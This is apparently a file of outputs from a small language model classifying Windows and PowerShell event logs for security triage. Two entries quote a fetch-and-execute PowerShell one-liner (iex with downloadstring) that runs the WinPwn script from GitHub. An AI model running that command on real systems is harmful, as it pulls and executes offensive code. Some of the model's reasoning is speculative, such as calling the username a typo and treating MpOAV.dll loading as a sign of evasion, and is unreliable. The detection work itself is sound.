{"file":"filtering\/phi4-mini\/attack\/20250606_143748.jsonl","analysis":"<think>\nOkay, let's see. I need to analyze these log entries to determine if they're interesting for investigation. Let me go through them one by one.\n\nFirst, there are multiple instances of powershell.exe being accessed or created. That's common, but maybe not suspicious on its own. Then there's whoami.exe being run, which is a standard command for checking user identity. But then I see a cmd.exe command line that includes powershell -exec bypass -e with some encoded string. That looks like it's bypassing execution policies, which is a red flag. The encoded part might be a malicious script.\n\nNext, there are several ImageLoad events for powershell.exe loading various DLLs. Some of them are legitimate, like mscoree.dll and clrjit.dll, which are part of the .NET framework. However, there's also MpOAV.dll from Windows Defender. That's a bit odd because why would PowerShell load a Defender DLL? Maybe it's being used for something unexpected.\n\nThen there's a FileDelete event for a temporary PowerShell script. Deleting a script after execution is common in malware to avoid leaving traces. Also, the FileCreate event for a StartupProfileData file might indicate persistence mechanisms.\n\nRegistry value set events for processes like svchost.exe and taskhostw.exe could be signs of configuration changes or attempts to modify system settings. The repeated ProcessAccess events might indicate monitoring or attempts to interact with other processes.\n\nPutting this all together: the use of -exec bypass suggests trying to run scripts without restrictions. The encoded command, deletion of temporary files, and loading of unexpected DLLs all point towards potential malicious activity. Even though some processes are legitimate, the combination of these events raises suspicion. The presence of Windows Defender DLLs being loaded by PowerShell might be a sign of evasion techniques. The overall pattern seems to be consistent with a malware trying to execute, persist, and cover its tracks. So, this batch is likely interesting for investigation.\n<\/think>\n\n{\n  \"CLASSIFICATION\": \"INTERESTING\",\n  \"JUSTIFICATION\": \"Multiple PowerShell instances with bypassed execution policies, suspicious encoded commands, file deletions, and loading of potentially malicious DLLs (e.g., MpOAV.dll) indicate possible malicious activity.\",\n  \"CONFIDENCE\": 0.85\n}"}
{"file":"filtering\/phi4-mini\/attack\/20250606_143748.jsonl","analysis":"<think>\nOkay, let me look at this data. So, the user provided a bunch of logs that seem to be from a PowerShell process. There's a lot of entries with \"sensitivefiles -noninteractive -consoleoutput\" and some command lines that include downloading a script from a GitHub URL. Hmm, that might be a red flag.\n\nFirst, I need to check if the command lines are malicious. The URL they're downloading from is \"https:\/\/raw.githubusercontent.com\/S3cur3Th1sSh1t\/WinPwn\/121dcee26a7aca368821563cbe92b2b5638c5773\/WinPwn.ps1\". Let me see if that repository is legitimate. I'll do a quick check. Oh, the username S3cur3Th1sSh1t is not a standard one. That might be a typo or a fake. Also, the repository name WinPwn sounds suspicious. Maybe it's a phishing or malware script.\n\nThe command uses \"iex\" which is Invoke-Expression, a common method for executing scripts in PowerShell. That's often used in malicious scripts to run code from strings. The fact that the script is being downloaded from a raw GitHub URL is risky because it's not a trusted source. Even if the script is benign, downloading and executing it from an unverified location can be dangerous.\n\nLooking at the logs, there are multiple entries with the same command line. That repetition might indicate that the script is being executed multiple times, possibly as part of a larger attack or a test. The presence of \"sensitivefiles -noninteractive -consoleoutput\" could be part of the script's parameters, but I'm not sure what that does. Maybe it's a custom tool or part of the malicious script's functionality.\n\nAnother thing to note is the use of \"& {iex(...)}\" which is a way to execute a script block. This is a common technique in PowerShell for running one-liners. The combination of downloading a script and executing it immediately is a classic sign of a malicious payload.\n\nI should also check the GitHub URL again. If I can access it, maybe I can see the content of WinPwn.ps1. But since I can't browse the internet right now, I'll have to rely on known patterns. The username and repository name don't look official. Legitimate repositories usually have more descriptive names and are maintained by verified users.\n\nAdditionally, the logs show that the process is running multiple times, which might be an attempt to bypass detection or to ensure the script is executed even if some attempts fail. The use of \"noninteractive\" and \"consoleoutput\" parameters might be to avoid user interaction or to log outputs to the console, which could be part of the attack's strategy.\n\nIn summary, the key points here are the suspicious GitHub URL, the use of Invoke-Expression to run downloaded code, the repetition of the command, and the possible malicious intent of the script. The user should be cautious and investigate this further, possibly by analyzing the downloaded script, checking the source of the URL, and ensuring that their systems are protected against such attacks.\n<\/think>\n\nThe logs indicate a potential **malicious PowerShell activity** involving the execution of a script downloaded from an external source. Here's a breakdown and analysis of the findings:\n\n---\n\n### **1. Suspicious PowerShell Command**\n- **Command Line Example**:\n  ```powershell\n  powershell.exe & {iex(new-object net.webclient).downloadstring('https:\/\/raw.githubusercontent.com\/S3cur3Th1sSh1t\/WinPwn\/121dcee26a7aca368821563cbe92b2b5638c5773\/WinPwn.ps1')\\nsensitivefiles -noninteractive -consoleoutput}\n  ```\n- **Key Components**:\n  - **`iex` (Invoke-Expression)**: A common PowerShell cmdlet used to execute strings as commands. Often exploited in malicious scripts.\n  - **`downloadstring`**: Downloads a script from a remote URL (here, a GitHub raw link).\n  - **`https:\/\/raw.githubusercontent.com\/S3cur3Th1sSh1t\/WinPwn\/...`**: The source URL is flagged as **suspicious** due to:\n    - **Unusual GitHub username**: `S3cur3Th1sSh1t` (likely a typo or obfuscation).\n    - **Repository name**: `WinPwn` (suggests potential malicious intent, as \"pwn\" is slang for \"hacking\").\n    - **No official verification**: The repository is not associated with well-known, legitimate projects.\n\n---\n\n### **2. Red Flags**\n- **Untrusted Source**: Downloading and executing scripts from unverified URLs (even if hosted on GitHub) is a **high-risk activity** and often used in **phishing, malware delivery, or remote code execution**.\n- **Repetition of Commands**: Multiple logs with the **same command** suggest either:\n  - **Automated exploitation** (e.g., brute-force attempts).\n  - **Testing or persistence mechanisms** (e.g., ensuring the script runs even if interrupted).\n- **`sensitivefiles -noninteractive -consoleoutput`**: These parameters may be part of the malicious script's logic (e.g., handling file operations or output suppression). However, their exact purpose is unclear without further analysis.\n\n---\n\n### **3. Recommendations**\n- **Immediate Actions**:\n  - **Block the URL**: Add the GitHub URL to a **blocklist** if it's confirmed malicious.\n  - **Isolate Affected Systems**: If this activity is detected on a network, isolate the affected host for investigation.\n  - **Check for Malware**: Use antivirus tools to scan the system for the downloaded script (`WinPwn.ps1`) and any related files.\n  - **Analyze the Script**: If safe, download and analyze the script to confirm its intent (e.g., check for obfuscation, payload extraction, or command execution).\n\n- **Long-Term Mitigations**:\n  - **Restrict PowerShell Usage**: Configure group policies to **disable `Invoke-Expression`** or limit PowerShell to **restricted language modes**.\n  - **Monitor Network Traffic**: Use tools like **SIEM** or **IDS** to detect unauthorized downloads or execution of scripts.\n  - **Educate Users**: Train personnel to avoid running scripts from untrusted sources, even if they appear to come from \"trusted\" domains like GitHub.\n\n---\n\n### **4. Next Steps**\n- **Verify the Script**: If the script is accessible, analyze it for malicious behavior (e.g., check for obfuscation, network connections, or file modifications).\n- **Investigate the Source**: Confirm whether the GitHub repository is legitimate or a phishing attempt.\n- **Report the Activity**: If this is part of a larger attack, report it to your organization's security team or a threat intelligence platform.\n\n---\n\n### **Summary**\nThis activity **strongly resembles a malicious PowerShell-based attack**, likely involving the execution of a downloaded script from an untrusted source. Immediate investigation and mitigation are required to prevent potential data breaches or system compromise."}
{"file":"filtering\/phi4-mini\/attack\/20250606_143748.jsonl","analysis":"<think>\nOkay, let's take a look at these events. So, the user provided a bunch of JSONL entries, each representing a system event. My job is to analyze the entire batch and decide if it's interesting for investigation.\n\nFirst, I notice that there are multiple entries with the same command line in the process field. The command line is using PowerShell to download a script from a GitHub URL. The URL is part of a repository named WinPwn, which sounds suspicious. The command uses 'iex' (Invoke-Expression) to execute the downloaded script, which is a common technique in PowerShell for running malicious code. \n\nThen, looking at the winlog task fields, most of them are 'Provider Lifecycle' or 'Engine Lifecycle'. However, there are also several entries where the task is 'Execute a Remote Command'. That's a red flag because executing remote commands can be part of a cyber attack, like downloading and running malware.\n\nNow, checking the process field for some entries, there are instances where the process is 'None', which might indicate that the event is not related to a specific process, perhaps a system-level event. But the ones with the PowerShell command are definitely processes that could be malicious.\n\nThe repetition of the same command line across multiple events suggests that this might be a pattern, possibly an attack that's been attempted multiple times. The fact that the same script is being downloaded from a specific GitHub repository might indicate a known malicious script. Also, the presence of 'sensitivefiles -noninteractive -consoleoutput' in the command line could be part of the payload, trying to access sensitive files without user interaction.\n\nHowever, I should consider if this is a false positive. For example, maybe the script is legitimate. But given the context of the command line and the tasks involved, it's more likely malicious. The confidence level would be high because of the repeated patterns and the nature of the commands involved.\n\nSo, putting it all together, the batch shows multiple attempts to execute a PowerShell command that downloads and runs a script from a suspicious source, along with events related to executing remote commands. This is a strong indicator of malicious activity, so the classification should be 'INTERESTING' with high confidence.\n<\/think>\n\n{\n  \"CLASSIFICATION\": \"INTERESTING\",\n  \"JUSTIFICATION\": \"Multiple repeated PowerShell commands downloading and executing a script from a GitHub repository named 'WinPwn' (commonly associated with malicious activity) with flags suggesting sensitive file access. Combined with 'Execute a Remote Command' events, this indicates potential lateral movement or data exfiltration.\",\n  \"CONFIDENCE\": 0.95\n}"}
